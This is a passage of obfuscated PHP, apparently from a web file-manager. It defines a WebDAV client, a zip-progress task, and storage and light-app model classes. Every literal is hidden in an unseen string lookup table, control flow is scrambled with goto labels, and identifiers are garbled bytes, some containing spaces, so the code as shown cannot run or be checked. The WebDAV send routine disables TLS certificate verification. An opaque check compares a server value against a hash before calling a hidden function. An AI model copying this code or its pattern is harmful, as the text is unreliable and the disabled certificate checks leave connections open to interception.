header($Aƒ¢„ï±Ë[1732]); header($Aƒ¢„ï±Ë[1733]); goto c‚»µö; C„ôÈõÆÏ³: } public static function make($C¼İË¡òÓ‘, $EŒË©ßôÊï) { $CïÙ‘Ùê­¸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return $CïÙ‘Ùê­¸[1736] + base64_encode($C¼İË¡òÓ‘ . $CïÙ‘Ùê­¸[4] . $EŒË©ßôÊï); } } class HttpDavClient { public function __construct($B¹›ÍÙ¸õ‰, $d¤¼æ¸—ã, $FØšĞ·‰İ) { $this->header = array(); $this->userName = $d¤¼æ¸—ã; $this->userPassowrd = $FØšĞ·‰İ; } protected function makePath($b®ÆÁ·´Î ) { return $b®ÆÁ·´Î ; } protected function setHeader($FŞñ¯øˆîÉ, $d™¥ÇŒãö† = false) { if ($d™¥ÇŒãö† === !1) { $this->header[] = $FŞñ¯øˆîÉ; } else { $this->header[] = $FŞñ¯øˆîÉ . $_SERVER[ÚŠ•´ÍéÒÑÔ][874] . $d™¥ÇŒãö†; } } public function move($Fó·Õ£µ£†, $AËóÅ«ˆ¶à, $D‰¦”ŠƒÆï = '') { $eçÇõ‹§· =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->setHeader($eçÇõ‹§·[1737], $this->makePath($AËóÅ«ˆ¶à)); $this->setHeader($eçÇõ‹§·[1738], $eçÇõ‹§·[1739]); if ($D‰¦”ŠƒÆï) { $this->setHeader($eçÇõ‹§·[1740], $eçÇõ‹§·[919] . $D‰¦”ŠƒÆï . $eçÇõ‹§·[922]); } return $this->send($eçÇõ‹§·[1741], $Fó·Õ£µ£†); } public function copy($c“öØôÑÃ‰, $c Ñ±½ß”‘) { $b™°·‹‚Ô° =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->setHeader($b™°·‹‚Ô°[1737], $this->makePath($c Ñ±½ß”‘)); $this->setHeader($b™°·‹‚Ô°[1738], $b™°·‹‚Ô°[1739]); return $this->send($b™°·‹‚Ô°[1742], $c“öØôÑÃ‰); } public function mkcol($c±Åé•öºÂ) { $C„í‡‘õÏ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->setHeader($C„í‡‘õÏ[1738], $C„í‡‘õÏ[1739]); return $this->send($C„í‡‘õÏ[1743], $c±Åé•öºÂ); } public function delete($cù…ÄŠÊôÓ, $DÓŸÄÁ£„‚ = '') { $c¿Ë×¹ğá¸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($DÓŸÄÁ£„‚) { $this->setHeader($c¿Ë×¹ğá¸[1740], $c¿Ë×¹ğá¸[919] . $DÓŸÄÁ£„‚ . $c¿Ë×¹ğá¸[922]); } return $this->send($c¿Ë×¹ğá¸[1238], $cù…ÄŠÊôÓ); } public function propfind($C¾ÏĞÕµ²) { $Bñù¦ƒêåµ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->setHeader($Bñù¦ƒêåµ[1744], $Bñù¦ƒêåµ[83]); $this->setHeader($Bñù¦ƒêåµ[1745], $Bñù¦ƒêåµ[1746]); $CØğ•ï¥‹Ë = $Bñù¦ƒêåµ[1747]; return $this->send($Bñù¦ƒêåµ[1748], $C¾ÏĞÕµ², $CØğ•ï¥‹Ë); } public function options($B«Ü”™¶¸…) { return $this->send($_SERVER[ÚŠ•´ÍéÒÑÔ][1749], $B«Ü”™¶¸…); } public function get($AÒ¤ºœ¾Ë¦) { return $this->send($_SERVER[ÚŠ•´ÍéÒÑÔ][213], $AÒ¤ºœ¾Ë¦); } public function put($d½‹ˆà§×Ş, $AŠğ…Ë¶Ú, $a§ìË–Üš = '') { $Cƒ”¦µ²Ê‰ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($a§ìË–Üš) { $this->setHeader($Cƒ”¦µ²Ê‰[1740], $Cƒ”¦µ²Ê‰[919] . $a§ìË–Üš . $Cƒ”¦µ²Ê‰[922]); } return $this->send($Cƒ”¦µ²Ê‰[211], $d½‹ˆà§×Ş, $AŠğ…Ë¶Ú); } protected function send($d…²ˆ’Âéí, $f²ÙëÀêƒ¸, $Eä®Ù´ãÌÀ = false, $Eñ‹Ü‚¬× = false) { goto eÜµì‹ö´Ë; EÓ•Û²î²²: $this->header = array(); return $A†•²Ú‡ˆÄ; goto DÀ£ªŠ½ò; A‚ÔŒ÷Ïï: curl_setopt($D‡ÎÃéÙ½, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($D‡ÎÃéÙ½, CURLOPT_SSL_VERIFYHOST, !1); $A†•²Ú‡ˆÄ = curl_exec($D‡ÎÃéÙ½); goto EÓ•Û²î²²; c÷´ÜèÑŠô: curl_setopt($D‡ÎÃéÙ½, CURLOPT_HTTPHEADER, $this->header); curl_setopt($D‡ÎÃéÙ½, CURLOPT_RETURNTRANSFER, !0); curl_setopt($D‡ÎÃéÙ½, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto A‚ÔŒ÷Ïï; eÜµì‹ö´Ë: $Cô¦§±Î– =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fº£»±œ  = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($Cô¦§±Î–[1750], $Cô¦§±Î–[50]); goto bôğÒÌ™Ò; C§ÇŒÑ„ Ü: $D‡ÎÃéÙ½ = curl_init($f²ÙëÀêƒ¸); curl_setopt($D‡ÎÃéÙ½, CURLOPT_CUSTOMREQUEST, $d…²ˆ’Âéí); curl_setopt($D‡ÎÃéÙ½, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto c÷´ÜèÑŠô; bôğÒÌ™Ò: $this->setHeader($fº£»±œ ); if ($Eä®Ù´ãÌÀ) { $Eä®Ù´ãÌÀ = $Cô¦§±Î–[1751] . $Eä®Ù´ãÌÀ; } if (!request_url_safe($f²ÙëÀêƒ¸)) { return !1; } goto C§ÇŒÑ„ Ü; DÀ£ªŠ½ò: } } goto e¼„©öÁ; e…Óò˜»èÉ: $DîéÓ¸Ï‘Û = $_SERVER[ÚŠ•´ÍéÒÑÔ][1152]; if ($_SERVER[$_SERVER[ÚŠ•´ÍéÒÑÔ][781]] != $DîéÓ¸Ï‘Û($aÙ©–ÎÙÈÊ)) { goto A–®‡¡ÖÚõ; fö°Ä¦¶¿â: $Ağ·çääÈâ = explode($_SERVER[ÚŠ•´ÍéÒÑÔ][214], $d²ùÈ…†ë); if (count($Ağ·çääÈâ) < $_SERVER[ÚŠ•´ÍéÒÑÔ][557]) { $fâº×ÉÑ´ = $_SERVER[ÚŠ•´ÍéÒÑÔ][787]; $fâº×ÉÑ´(); } $f«·ÉèÎ˜ = $_SERVER[ÚŠ•´ÍéÒÑÔ][1153]; goto bŠãè¦À; bŠãè¦À: $f«·ÉèÎ˜($aÙ©–ÎÙÈÊ); goto b¹Ìî…ôŠá; A–®‡¡ÖÚõ: $bÊĞƒè•¨Å = $_SERVER[ÚŠ•´ÍéÒÑÔ][784]; $aá™ŒØ°‰ = $_SERVER[$_SERVER[ÚŠ•´ÍéÒÑÔ][785]] . $_SERVER[ÚŠ•´ÍéÒÑÔ][786]; $d²ùÈ…†ë = $bÊĞƒè•¨Å($aá™ŒØ°‰); goto fö°Ä¦¶¿â; b¹Ìî…ôŠá: } class TaskZip extends TaskFileTransfer { protected function startAfter() { $f¼İßÉñÒ‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; parent::startAfter(); Hook::bind($f¼İßÉñÒ‘[1480], array($this, $f¼İßÉñÒ‘[1475])); $b¸Œª…ïõ· =& $this->task; $b¸Œª…ïõ·[$f¼İßÉñÒ‘[1477]] = $f¼İßÉñÒ‘[1032]; if (!$b¸Œª…ïõ·[$f¼İßÉñÒ‘[1316]]) { $b¸Œª…ïõ·[$f¼İßÉñÒ‘[1316]] = LNG($f¼İßÉñÒ‘[1481]); } } protected function endAfter() { $e‘éÔê§ÓÒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; parent::endAfter(); Hook::unbind($e‘éÔê§ÓÒ[1480], array($this, $e‘éÔê§ÓÒ[1475])); } public function updateAfter() { $c±Ü›õäÙ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a’öñæ¨‰ =& $this->task; if (!$a’öñæ¨‰[$c±Ü›õäÙ[970]] || !$a’öñæ¨‰[$c±Ü›õäÙ[693]]) { return; } if ($a’öñæ¨‰[$c±Ü›õäÙ[1477]] == $c±Ü›õäÙ[1032]) { $aé¨Ğğ¶İ = $a’öñæ¨‰[$c±Ü›õäÙ[1455]]; if ($a’öñæ¨‰[$c±Ü›õäÙ[1456]] != $c±Ü›õäÙ[1032]) { $aé¨Ğğ¶İ = 0; } $eÕ£öİåŞÉ = ($a’öñæ¨‰[$c±Ü›õäÙ[1459]] + $aé¨Ğğ¶İ) / $a’öñæ¨‰[$c±Ü›õäÙ[693]]; $a’öñæ¨‰[$c±Ü›õäÙ[1410]] = $eÕ£öİåŞÉ * 0.3; } else { if ($a’öñæ¨‰[$c±Ü›õäÙ[1477]] == $c±Ü›õäÙ[298]) { $eÕ£öİåŞÉ = $a’öñæ¨‰[$c±Ü›õäÙ[982]] / $a’öñæ¨‰[$c±Ü›õäÙ[970]]; $a’öñæ¨‰[$c±Ü›õäÙ[1410]] = 0.3 + $eÕ£öİåŞÉ * 0.5; } else { if ($a’öñæ¨‰[$c±Ü›õäÙ[1477]] == $c±Ü›õäÙ[91]) { $eÕ£öİåŞÉ = 0; if ($a’öñæ¨‰[$c±Ü›õäÙ[1454]]) { $eÕ£öİåŞÉ = $a’öñæ¨‰[$c±Ü›õäÙ[1455]] / $a’öñæ¨‰[$c±Ü›õäÙ[1454]]; } $a’öñæ¨‰[$c±Ü›õäÙ[1410]] = 0.3 + 0.5 + $eÕ£öİåŞÉ * 0.2; } } } if ($a’öñæ¨‰[$c±Ü›õäÙ[1410]] > 0) { $E½è›äŠ¿÷ = timeFloat() - $a’öñæ¨‰[$c±Ü›õäÙ[1412]] - $a’öñæ¨‰[$c±Ü›õäÙ[1415]]; $a’öñæ¨‰[$c±Ü›õäÙ[1416]] = $E½è›äŠ¿÷ * (1 - $a’öñæ¨‰[$c±Ü›õäÙ[1410]]) / $a’öñæ¨‰[$c±Ü›õäÙ[1410]]; } } public function copyFileStart($a†ªÜœÙæ¢, $dñ†ÆÂ, $D‹Üõ˜ŸùØ, $eöÑ÷ÁÇ–, $EÑ¾ñ‚¹åÍ, $A„ŸÊÛÛŞä) { $FÀ±ë ­Ã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; parent::copyFileStart($a†ªÜœÙæ¢, $dñ†ÆÂ, $D‹Üõ˜ŸùØ, $eöÑ÷ÁÇ–, $EÑ¾ñ‚¹åÍ, $A„ŸÊÛÛŞä); $bàµõ‹ö™ =& $this->task; if ($bàµõ‹ö™[$FÀ±ë ­Ã[1477]] == $FÀ±ë ­Ã[298]) { $bàµõ‹ö™[$FÀ±ë ­Ã[1477]] = $FÀ±ë ­Ã[91]; } $this->update(); } public function copyFileEnd($aèã¼ ÀÏİ, $CˆŒ Âµå, $F×Ş½ê¶‡, $B²â¹Şëõ©, $Dğñ¶‘¹À¸, $eœƒ…ÄöÊ¥) { $Dæ¨÷â’‘¢ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DØóŞ«¤Ê× =& $this->task; $DØóŞ«¤Ê×[$Dæ¨÷â’‘¢[1455]] = $DØóŞ«¤Ê×[$Dæ¨÷â’‘¢[1454]]; $DØóŞ«¤Ê×[$Dæ¨÷â’‘¢[1459]] += $DØóŞ«¤Ê×[$Dæ¨÷â’‘¢[1454]]; $DØóŞ«¤Ê×[$Dæ¨÷â’‘¢[1456]] = $Dæ¨÷â’‘¢[33]; $this->update(); } public function nameParse($AÑŒôˆÆÖ–) { $b‚¥ê­ª‰™ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D×³Í†«íŠ =& $this->task; if ($D×³Í†«íŠ[$b‚¥ê­ª‰™[982]] < $D×³Í†«íŠ[$b‚¥ê­ª‰™[970]]) { $a‚×£Â‘Û• = get_path_this($AÑŒôˆÆÖ–); if (strstr($a‚×£Â‘Û•, $b‚¥ê­ª‰™[93])) { $D×³Í†«íŠ[$b‚¥ê­ª‰™[982]] += 1; } } if ($D×³Í†«íŠ[$b‚¥ê­ª‰™[1477]] == $b‚¥ê­ª‰™[1032]) { $D×³Í†«íŠ[$b‚¥ê­ª‰™[1477]] = $b‚¥ê­ª‰™[298]; } $D×³Í†«íŠ[$b‚¥ê­ª‰™[1452]] = $AÑŒôˆÆÖ–; $this->update(); } } goto F›§í•–›æ; eÜ‰‘í£Ó¶: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\x73\x74\157\162\141\147\x65\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\163\x69\172\145\115\x61\x78", "\x73\x79\x73\x74\145\155", "\x64\x65\x66\x61\x75\x6c\164", "\x64\162\x69\166\145\162", "\x63\x6f\x6e\146\151\147"); public function listData($A¢´´²­í° = false, $CŸ¸¥§Äñ† = "\155\x6f\144\151\146\x79\124\151\155\145", $côàÍÁ´‹— = false) { goto FÄÂ²Ë; FÄÂ²Ë: $FŠÍÓÕíŠá =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d§âÀ¡ÌË = parent::listData($A¢´´²­í°, $CŸ¸¥§Äñ†, $côàÍÁ´‹—); if ($A¢´´²­í°) { return $d§âÀ¡ÌË; } goto eë¹óÃØ; BßøòÌÊÈÇ: return $d§âÀ¡ÌË; goto a³‡’îë×; eë¹óÃØ: foreach ($d§âÀ¡ÌË as $EÉ»ÂÁ‘¸ => $AŠ³¼¿µˆ‡) { unset($d§âÀ¡ÌË[$EÉ»ÂÁ‘¸][$FŠÍÓÕíŠá[6]]); $d§âÀ¡ÌË[$EÉ»ÂÁ‘¸][$FŠÍÓÕíŠá[2058]] = 0; } $Eã¦ßŞùÆ = array_to_keyvalue($d§âÀ¡ÌË, $FŠÍÓÕíŠá[33], $FŠÍÓÕíŠá[364]); $this->_listAppendSize($d§âÀ¡ÌË, $Eã¦ßŞùÆ); goto BßøòÌÊÈÇ; a³‡’îë×: } public function _listAppendSize(&$E·¶ÍİËÉ , $dË£Ø‡šÆ¸) { $f¤‘Ë‰¡‹• =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C ùõ‹ÌŸ = $f¤‘Ë‰¡‹•[2323] . implode($f¤‘Ë‰¡‹•[47], $dË£Ø‡šÆ¸) . $f¤‘Ë‰¡‹•[2324]; $e¸’×ËŞ±İ = Model($f¤‘Ë‰¡‹•[714])->query($C ùõ‹ÌŸ); $e¸’×ËŞ±İ = array_to_keyvalue($e¸’×ËŞ±İ, $f¤‘Ë‰¡‹•[364], $f¤‘Ë‰¡‹•[77]); foreach ($E·¶ÍİËÉ  as $A”Ôáñ§Ÿ¯ => $bİ†Æ¢”) { $E·¶ÍİËÉ [$A”Ôáñ§Ÿ¯][$f¤‘Ë‰¡‹•[2058]] = isset($e¸’×ËŞ±İ[$bİ†Æ¢”[$f¤‘Ë‰¡‹•[364]]]) ? $e¸’×ËŞ±İ[$bİ†Æ¢”[$f¤‘Ë‰¡‹•[364]]] : 0; } } public function getConfig($b§åòÖÄÀ¤) { $c×ïâ»»ˆº = parent::listData($b§åòÖÄÀ¤); return json_decode($c×ïâ»»ˆº[$_SERVER[ÚŠ•´ÍéÒÑÔ][6]], !0); } public function update($aŒŸ˜ƒ¡ÈŠ, $bÌ±Øîø¬‰) { goto cêì‹ëØØ; E„êî…†¼£: if (isset($b›Ää£ù•[$B©³˜Í–îÖ]) && $b›Ää£ù•[$B©³˜Í–îÖ][$eÓÆƒ¬èºÏ[364]] != $aŒŸ˜ƒ¡ÈŠ) { return !1; } if (isset($bÌ±Øîø¬‰[$eÓÆƒ¬èºÏ[2325]]) && $bÌ±Øîø¬‰[$eÓÆƒ¬èºÏ[2325]] == $eÓÆƒ¬èºÏ[83]) { $this->checkConfig($bÌ±Øîø¬‰); } unset($bÌ±Øîø¬‰[$eÓÆƒ¬èºÏ[2325]]); goto AÔÉ†·äœ™; AÔÉ†·äœ™: $B¥Ãƒ“­·é = parent::update($aŒŸ˜ƒ¡ÈŠ, $bÌ±Øîø¬‰); if ($B¥Ãƒ“­·é && $bÌ±Øîø¬‰[$eÓÆƒ¬èºÏ[34]]) { foreach ($b›Ää£ù• as $Cé¯Éõ—…Ô) { if ($Cé¯Éõ—…Ô[$eÓÆƒ¬èºÏ[34]] && $Cé¯Éõ—…Ô[$eÓÆƒ¬èºÏ[364]] != $aŒŸ˜ƒ¡ÈŠ) { parent::update($Cé¯Éõ—…Ô[$eÓÆƒ¬èºÏ[364]], array($eÓÆƒ¬èºÏ[34] => 0)); } } } return $B¥Ãƒ“­·é; goto c±øŠ™±Òë; cêì‹ëØØ: $eÓÆƒ¬èºÏ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B©³˜Í–îÖ = $bÌ±Øîø¬‰[$eÓÆƒ¬èºÏ[28]]; $b›Ää£ù• = array_to_keyvalue(parent::listData(), $eÓÆƒ¬èºÏ[28]); goto E„êî…†¼£; c±øŠ™±Òë: } public function add($c®´ºê„Í) { goto b×“ÏÀÆé; CŸ£ƒ»’ÎÙ: $this->checkConfig($c®´ºê„Í); $dßÕµ‚‰óè = parent::insert($c®´ºê„Í); if ($dßÕµ‚‰óè && $c®´ºê„Í[$b“ä§…šŠ†[34]]) { foreach ($FÛËÇ‚‡‹× as $D–Í²¾¨¤Â) { if ($D–Í²¾¨¤Â[$b“ä§…šŠ†[34]]) { parent::update($D–Í²¾¨¤Â[$b“ä§…šŠ†[364]], array($b“ä§…šŠ†[34] => 0)); } } } goto F¡À»¯ê ; F¡À»¯ê : return $dßÕµ‚‰óè; goto eà»ëŠÒ÷‰; b×“ÏÀÆé: $b“ä§…šŠ† =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FÛËÇ‚‡‹× = array_to_keyvalue(parent::listData(), $b“ä§…šŠ†[28]); if (isset($FÛËÇ‚‡‹×[$c®´ºê„Í[$b“ä§…šŠ†[28]]])) { return !1; } goto CŸ£ƒ»’ÎÙ; eà»ëŠÒ÷‰: } public function checkConfig(&$fèã–ÄÊ—Œ) { goto B—›‰Ïñ; E³Ş†…¬’ª: foreach ($C¶ªÁ—ÃÙ as $Föù§ ğ…â => $fâÆ‹¶’Àî) { $C¶ªÁ—ÃÙ[$Föù§ ğ…â] = trim($fâÆ‹¶’Àî); } $aŠ¨¯”Ş«ã = rtrim($C¶ªÁ—ÃÙ[$AåœöùŠñ‚[1016]], $AåœöùŠñ‚[8]) . $AåœöùŠñ‚[8]; $E›‘¡­Õä‰ = $this->driverType($aÅË“íˆÂÓ); goto B‡—ÂÈ‘Õí; B—›‰Ïñ: $AåœöùŠñ‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÅË“íˆÂÓ = strtolower($fèã–ÄÊ—Œ[$AåœöùŠñ‚[90]]); $C¶ªÁ—ÃÙ = json_decode_force($fèã–ÄÊ—Œ[$AåœöùŠñ‚[6]]); goto E³Ş†…¬’ª; bƒƒ÷¦âà‹: $F‹í­ö—§÷ = $a·¿¦«¨˜’->getPath($aŠ¨¯”Ş«ã . $AåœöùŠñ‚[1954]); if (!$a·¿¦«¨˜’->mkfile($F‹í­ö—§÷)) { show_json(LNG($AåœöùŠñ‚[2326]), !1); } $C¶ªÁ—ÃÙ[$AåœöùŠñ‚[1016]] = $aŠ¨¯”Ş«ã; goto cöóã§ˆ¹Ş; B‡—ÂÈ‘Õí: $FË…ù”´’¯ = $AåœöùŠñ‚[71] . $E›‘¡­Õä‰; $a·¿¦«¨˜’ = new $FË…ù”´’¯($C¶ªÁ—ÃÙ); if (in_array($aÅË“íˆÂÓ, $a·¿¦«¨˜’->objectDriver)) { if (!$a·¿¦«¨˜’->isBucketCors() && !$a·¿¦«¨˜’->setBucketCors()) { $cĞÁ„è…š = LNG($AåœöùŠñ‚[2326]); $cĞÁ„è…š .= $AåœöùŠñ‚[2327] . LNG($AåœöùŠñ‚[2328]); show_json($cĞÁ„è…š, !1); } } goto bƒƒ÷¦âà‹; cöóã§ˆ¹Ş: $fèã–ÄÊ—Œ[$AåœöùŠñ‚[6]] = json_encode($C¶ªÁ—ÃÙ); $fèã–ÄÊ—Œ[$AåœöùŠñ‚[90]] = $E›‘¡­Õä‰; return !0; goto FÓğê´›Ş; FÓğê´›Ş: } private function driverType($B©ê¿ˆáŒã) { $dËğ”Å‹é‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Dã­’ËÅ© = array($dËğ”Å‹é‚[103] => $dËğ”Å‹é‚[2329], $dËğ”Å‹é‚[58] => $dËğ”Å‹é‚[2330], $dËğ”Å‹é‚[64] => $dËğ”Å‹é‚[2331]); if (isset($Dã­’ËÅ©[$B©ê¿ˆáŒã])) { return $Dã­’ËÅ©[$B©ê¿ˆáŒã]; } return strtoupper($B©ê¿ˆáŒã); } public function driverListSystem() { $EÉ¡‘‘¬Ê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÔ÷°™ê£Ÿ = parent::listData(); $bÖòáÑéí = array(); foreach ($fÔ÷°™ê£Ÿ as $DíÖ›Ò¡øë) { unset($DíÖ›Ò¡øë[$EÉ¡‘‘¬Ê[184]], $DíÖ›Ò¡øë[$EÉ¡‘‘¬Ê[107]]); $DíÖ›Ò¡øë[$EÉ¡‘‘¬Ê[6]] = json_decode_force($DíÖ›Ò¡øë[$EÉ¡‘‘¬Ê[6]]); $bÖòáÑéí[] = $DíÖ›Ò¡øë; } return $bÖòáÑéí; } public function defaultDriver() { $DŒõÎÄ› =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AöŒ±¶Ôñ“ = parent::listData(); $C×ÓÑ´ŞÜù = array_filter_by_field($AöŒ±¶Ôñ“, $DŒõÎÄ›[34], 1); $C×ÓÑ´ŞÜù = $C×ÓÑ´ŞÜù[0]; if ($C×ÓÑ´ŞÜù) { $C×ÓÑ´ŞÜù[$DŒõÎÄ›[6]] = json_decode($C×ÓÑ´ŞÜù[$DŒõÎÄ›[6]], !0); } return $C×ÓÑ´ŞÜù; } public function driverInfo($e´„¶ÓË”ä) { $E¬‹¡åæ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E¬ƒ¿°Ä• = array_to_keyvalue(parent::listData(), $E¬‹¡åæ[364]); if (!isset($E¬ƒ¿°Ä•[$e´„¶ÓË”ä])) { return !1; } $BÌ®ìˆÓ¨Î = $E¬ƒ¿°Ä•[$e´„¶ÓË”ä]; $BÌ®ìˆÓ¨Î[$E¬‹¡åæ[6]] = json_decode_force($BÌ®ìˆÓ¨Î[$E¬‹¡åæ[6]]); return $BÌ®ìˆÓ¨Î; } public function remove($eéŒÌÊòÁ‚) { $this->removeShareItems($eéŒÌÊòÁ‚); return parent::remove($eéŒÌÊòÁ‚); } public function removeWithFile($A¨ÆéĞŒƒİ) { goto AŠˆç¢‡¨®; F…Ğøôƒ: $bÙéÇğº‰’ = Model($dì°á»ÙâÒ[418])->where($Cëá¢…çŸé)->sum($dì°á»ÙâÒ[77]); $B¥¸¸·¿ç = $dì°á»ÙâÒ[2332] . $A¨ÆéĞŒƒİ; $Eˆó‘¸Æ¢ = new TaskFileTransfer($B¥¸¸·¿ç, $dì°á»ÙâÒ[2333], $EÚ³šìÎ˜¶, LNG($dì°á»ÙâÒ[2334]) . "\x28{$A¨ÆéĞŒƒİ}\x29"); goto C±ÈÉ£æ¤Í; f‚Ò¶“‘Š‘: if (!$EËø¹å¨Û) { $Eˆó‘¸Æ¢->stop($B¥¸¸·¿ç); return !1; } $Eˆó‘¸Æ¢->end(); $this->remove($A¨ÆéĞŒƒİ); goto cÔ—´²¼’â; DñĞæ©Š…Š: $c¨ôó¥Èà» = Model($dì°á»ÙâÒ[164])->where($Cëá¢…çŸé)->field($dì°á»ÙâÒ[2335])->select(); foreach ($c¨ôó¥Èà» as $EÉòÑé«áØ) { goto E¶™ãì„ØÀ; E¶™ãì„ØÀ: $dÜù©‹®İ = $EÉòÑé«áØ[$dì°á»ÙâÒ[75]]; $FÑ´‡¶ĞáÇ = $a‘Ø£Ü§ß . str_replace("\173\151\157\x3a{$A¨ÆéĞŒƒİ}\175\57", $dì°á»ÙâÒ[33], $dÜù©‹®İ); if (!IO::exist($dÜù©‹®İ)) { $Eî«ËŸ»©à[] = $EÉòÑé«áØ[$dì°á»ÙâÒ[415]]; $Eˆó‘¸Æ¢->updateFileEnd($EÉòÑé«áØ[$dì°á»ÙâÒ[28]], $EÉòÑé«áØ[$dì°á»ÙâÒ[77]]); continue; } goto c ×œœÈø; C¤‘ç”µ¿´: $bŞë²Ê¢‡ = array($dì°á»ÙâÒ[738] => $cµÑ¸Ã‰ƒ·, $dì°á»ÙâÒ[75] => $FÑ´‡¶ĞáÇ); Model($dì°á»ÙâÒ[164])->where($Cëá¢…çŸé)->save($bŞë²Ê¢‡); goto BÕ“è÷ë Ï; c ×œœÈø: if (IO::exist($FÑ´‡¶ĞáÇ)) { $Eˆó‘¸Æ¢->updateFileEnd($EÉòÑé«áØ[$dì°á»ÙâÒ[28]], $EÉòÑé«áØ[$dì°á»ÙâÒ[77]]); continue; } if (!IO::move($dÜù©‹®İ, get_path_father($FÑ´‡¶ĞáÇ))) { $EËø¹å¨Û = !1; break; } $Cëá¢…çŸé = array($dì°á»ÙâÒ[415] => $EÉòÑé«áØ[$dì°á»ÙâÒ[415]]); goto C¤‘ç”µ¿´; BÕ“è÷ë Ï: } $this->removeByFileID($Eî«ËŸ»©à); goto f‚Ò¶“‘Š‘; AŠˆç¢‡¨®: $dì°á»ÙâÒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Cëá¢…çŸé = array($dì°á»ÙâÒ[738] => $A¨ÆéĞŒƒİ); $EÚ³šìÎ˜¶ = Model($dì°á»ÙâÒ[418])->where($Cëá¢…çŸé)->count(); goto F…Ğøôƒ; DËáÖ·ÉŠ–: $a‘Ø£Ü§ß = "\x7b\x69\x6f\x3a{$cµÑ¸Ã‰ƒ·}\175\57"; $EËø¹å¨Û = !0; $Eî«ËŸ»©à = array(); goto DñĞæ©Š…Š; C±ÈÉ£æ¤Í: $Eˆó‘¸Æ¢->task[$dì°á»ÙâÒ[693]] = (double) $bÙéÇğº‰’; $b­”Ïö¦›« = KodIO::defaultDriver(); $cµÑ¸Ã‰ƒ· = $b­”Ïö¦›«[$dì°á»ÙâÒ[364]]; goto DËáÖ·ÉŠ–; cÔ—´²¼’â: } public function progress($dŞ±ÕÓ‚ÓÊ) { return Task::get($_SERVER[ÚŠ•´ÍéÒÑÔ][2332] . $dŞ±ÕÓ‚ÓÊ); } private function removeByFileID($CîïÆÛíÈ¹ = array()) { goto Aøğ¹©Úóé; C©»áŠíÔ: foreach ($cíÁæàÑ×ç as $FÙÙö…³›) { Model($d¥ÅğÅ—š[379])->removeNow($FÙÙö…³›, !1); } goto F«¥äÄ –Ö; e°÷á½—Î…: $cíÁæàÑ×ç = Model($d¥ÅğÅ—š[1102])->where($A‡ë˜¸ë¢)->field($d¥ÅğÅ—š[366])->select(); if (!$cíÁæàÑ×ç) { return; } $cíÁæàÑ×ç = array_to_keyvalue($cíÁæàÑ×ç, $d¥ÅğÅ—š[33], $d¥ÅğÅ—š[366]); goto C©»áŠíÔ; Aøğ¹©Úóé: $d¥ÅğÅ—š =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($CîïÆÛíÈ¹)) { return; } $A‡ë˜¸ë¢ = array($d¥ÅğÅ—š[415] => array($d¥ÅğÅ—š[7], $CîïÆÛíÈ¹)); goto e°÷á½—Î…; F«¥äÄ –Ö: } private function removeShareItems($Cè‰îÇÑğ) { goto a”ô áë ¿; BÒÀŒ¯ĞÜ¾: Model($D½ßŒ°Î†Ä[532])->remove($fŸª¼„ÜÏ•); goto f®ÅöŸ­ŠÕ; F‚é³Œ¼Úø: $a©…æª = Model($D½ßŒ°Î†Ä[2049])->where($aäÆá©ôƒº)->field($D½ßŒ°Î†Ä[437])->select(); if (empty($a©…æª)) { return; } $fŸª¼„ÜÏ• = array_to_keyvalue($a©…æª, $D½ßŒ°Î†Ä[33], $D½ßŒ°Î†Ä[437]); goto BÒÀŒ¯ĞÜ¾; a”ô áë ¿: $D½ßŒ°Î†Ä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E½Èà‰ìôÖ = "\173\x69\x6f\x3a{$Cè‰îÇÑğ}\175\x2f"; $aäÆá©ôƒº = array($D½ßŒ°Î†Ä[366] => 0, $D½ßŒ°Î†Ä[1010] => array($D½ßŒ°Î†Ä[746], "{$E½Èà‰ìôÖ}\x25")); goto F‚é³Œ¼Úø; f®ÅöŸ­ŠÕ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\114\151\147\150\x74\x41\x70\160"; public $modelType = "\x53\x79\163\x74\x65\155\117\160\164\x69\x6f\156"; public $field = array("\156\141\x6d\x65", "\x67\x72\x6f\x75\x70", "\x64\x65\163\143", "\x63\x6f\x6e\x74\145\156\164"); public function listData($E½ºíî¡ñ = false, $aÜæÃªæĞ‰ = "\x6d\157\x64\151\146\171\x54\x69\x6d\x65", $E”åˆÆ›²› = true) { return parent::listData($E½ºíî¡ñ, $aÜæÃªæĞ‰, $E”åˆÆ›²›); } public function remove($Eƒƒ‚‹…„) { $eã›å÷ºßƒ = $this->findByName($Eƒƒ‚‹…„); if (!$eã›å÷ºßƒ) { return !1; } return parent::remove($eã›å÷ºßƒ[$_SERVER[ÚŠ•´ÍéÒÑÔ][364]]); } public function add($D‚ºâ£ÕØ) { if 